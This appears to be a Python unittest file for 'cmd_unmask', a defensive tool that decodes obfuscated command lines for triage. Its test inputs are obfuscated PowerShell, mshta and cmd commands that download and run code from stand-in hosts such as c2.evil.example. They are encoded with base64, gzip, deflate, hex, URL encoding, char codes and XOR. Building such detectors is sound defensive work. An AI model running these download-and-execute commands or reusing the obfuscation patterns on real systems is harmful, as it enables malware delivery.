import base64
import gzip
import unittest
import zlib

from cmd_unmask import TriageConfig, unmask_command, unpack_dag


class TestBoundedUnpackingDagAndDecoders(unittest.TestCase):
    def test_base64_utf16le_unpadded_and_reconstructed_command(self) -> None:
        inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/stage1.ps1')"
        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii").rstrip("=")
        cmd = f"powershell.exe -NoP -W Hidden -enc {b64}"
        verdict = unmask_command(cmd)
        self.assertIn(inner, verdict.primary_unmasked_payload)
        self.assertIn("powershell.exe", verdict.primary_unmasked_payload)
        techniques = [step.technique for step in verdict.provenance_chain]
        self.assertTrue(any("base64" in t for t in techniques))

    def test_urlsafe_base64_and_gzip_stream_unpacking(self) -> None:
        inner = "Invoke-WebRequest -Uri https://c2.evil.example/payload.bin -OutFile C:\\Temp\\p.exe"
        compressed = gzip.compress(inner.encode("utf-8"))
        b64_urlsafe = base64.urlsafe_b64encode(compressed).decode("ascii").rstrip("=")
        cmd = (
            "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('"
            + b64_urlsafe
            + "')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )
        verdict = unmask_command(cmd)
        self.assertIn("https://c2.evil.example/payload.bin", verdict.primary_unmasked_payload)

    def test_deflate_stream_and_multilayer_interleaving(self) -> None:
        # Layer 2: expression obfuscation inside deflate-compressed base64
        inner_expr = "(\"{1}{0}\" -f 'Client','Net.Web') + ' http://deflate.evil.example/a'"
        raw_deflate = zlib.compress(inner_expr.encode("utf-8"))[2:-4]
        b64_deflate = base64.b64encode(raw_deflate).decode("ascii")
        cmd = f"p^o^w^e^r^s^h^e^l^l -c \"DeflateStream('{b64_deflate}')\""
        verdict = unmask_command(cmd)
        self.assertIn("Net.WebClient", verdict.primary_unmasked_payload)
        self.assertIn("http://deflate.evil.example/a", verdict.primary_unmasked_payload)

    def test_hex_url_and_charcode_decoders(self) -> None:
        hex_payload = b"powershell -c IEX(http://hex.evil.example/run.ps1)".hex()
        verdict_hex = unmask_command(f"cmd /c {hex_payload}")
        self.assertIn("http://hex.evil.example/run.ps1", verdict_hex.primary_unmasked_payload)

        url_cmd = "mshta.exe http%3A%2F%2Furl.evil.example%2Fpayload.hta"
        verdict_url = unmask_command(url_cmd)
        self.assertIn("http://url.evil.example/payload.hta", verdict_url.primary_unmasked_payload)

        charcodes = ",".join(str(ord(c)) for c in "powershell -c http://char.evil.example/x")
        verdict_char = unmask_command(f"fromCharCode({charcodes})")
        self.assertIn("http://char.evil.example/x", verdict_char.primary_unmasked_payload)

    def test_explicit_xor_and_fallback_single_byte_xor_bruteforce(self) -> None:
        plaintext = b"powershell.exe -nop -w hidden -c IEX(http://xor.evil.example/a.ps1)"
        key = 0x3A
        xored_b64 = base64.b64encode(bytes(b ^ key for b in plaintext)).decode("ascii")
        # Explicit -bxor syntax
        cmd_explicit = f"[Convert]::FromBase64String('{xored_b64}') | % {{ $_ -bxor 0x3A }}"
        verdict_exp = unmask_command(cmd_explicit)
        self.assertIn("http://xor.evil.example/a.ps1", verdict_exp.primary_unmasked_payload)

        # Fallback brute-force on high-entropy unannotated blob
        key2 = 0x55
        xored_b64_2 = base64.b64encode(bytes(b ^ key2 for b in plaintext)).decode("ascii")
        verdict_bf = unmask_command(f"powershell -c '{xored_b64_2}'")
        self.assertIn("http://xor.evil.example/a.ps1", verdict_bf.primary_unmasked_payload)

    def test_detection_rigidity_rejects_benign_words_and_enforces_resource_ceilings(self) -> None:
        benign = "git status && python -m unittest discover -s tests -v"
        dag_benign = unpack_dag(benign)
        self.assertEqual(len(dag_benign.nodes), 1)
        self.assertEqual(dag_benign.nodes[dag_benign.primary_leaf_id].text, benign)

        # Zip-bomb protection (max_stream_bytes ceiling)
        huge_payload = b"A" * 500_000
        bomb_b64 = base64.b64encode(gzip.compress(huge_payload)).decode("ascii")
        cfg = TriageConfig(max_stream_bytes=32_768)
        verdict_bomb = unmask_command(f"powershell -enc {bomb_b64}", config=cfg)
        self.assertTrue(any("stream" in w.lower() or "exceed" in w.lower() or "limit" in w.lower() for w in verdict_bomb.warnings))


if __name__ == "__main__":
    unittest.main()
